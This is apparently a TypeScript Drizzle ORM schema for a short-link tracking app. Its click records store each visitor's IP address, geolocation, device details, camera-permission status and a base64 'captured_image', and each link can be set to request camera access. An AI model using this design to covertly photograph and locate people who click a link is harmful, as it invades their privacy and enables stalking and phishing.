import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, boolean, integer, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const trackingLinks = pgTable("tracking_links", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  originalUrl: text("original_url").notNull(),
  shortCode: varchar("short_code", { length: 10 }).notNull().unique(),
  campaignName: text("campaign_name"),
  collectLocation: boolean("collect_location").default(true),
  collectDevice: boolean("collect_device").default(true),
  requestCamera: boolean("request_camera").default(false),
  isActive: boolean("is_active").default(true),
  clickCount: integer("click_count").default(0),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const trackingClicks = pgTable("tracking_clicks", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  linkId: varchar("link_id").notNull().references(() => trackingLinks.id),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  location: jsonb("location"), // { country, city, lat, lng }
  deviceInfo: jsonb("device_info"), // { type, browser, os }
  cameraAccess: text("camera_access"), // 'granted', 'denied', 'not_requested'
  capturedImage: text("captured_image"), // base64 encoded image data
  timestamp: timestamp("timestamp").defaultNow(),
});

export const insertTrackingLinkSchema = createInsertSchema(trackingLinks).omit({
  id: true,
  shortCode: true,
  clickCount: true,
  createdAt: true,
  updatedAt: true,
});

export const insertTrackingClickSchema = createInsertSchema(trackingClicks).omit({
  id: true,
  timestamp: true,
});

export type InsertTrackingLink = z.infer<typeof insertTrackingLinkSchema>;
export type TrackingLink = typeof trackingLinks.$inferSelect;
export type InsertTrackingClick = z.infer<typeof insertTrackingClickSchema>;
export type TrackingClick = typeof trackingClicks.$inferSelect;

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});
